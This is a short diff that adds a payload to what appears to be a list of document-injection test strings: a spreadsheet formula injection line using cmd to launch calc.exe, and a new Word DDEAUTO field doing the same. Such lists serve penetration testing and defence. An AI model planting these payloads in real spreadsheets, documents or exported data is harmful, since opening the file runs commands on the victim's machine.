@@ -2,3 +2,6 @@
 
 
 =cmd|'/k calc.exe '!'A1'
+
+
+{DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"}
